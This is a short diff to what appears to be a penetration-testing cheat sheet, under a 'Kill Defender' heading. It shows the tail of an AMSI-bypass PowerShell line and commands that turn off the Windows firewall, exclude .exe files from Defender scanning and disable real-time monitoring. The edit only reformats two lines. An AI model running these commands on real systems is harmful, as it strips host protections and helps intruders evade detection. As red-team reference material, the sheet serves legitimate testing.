@@ -57,8 +57,8 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 # Kill Defender
 
 ```
-Disable firewall - New way	netsh advfirewall set allprofiles state off
-Firewall rules	netsh advfirewall firewall show rule name=all
+netsh advfirewall set allprofiles state off
+Firewall rules netsh advfirewall firewall show rule name=all
 Add-MpPreference -ExclusionExtension ".exe"
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
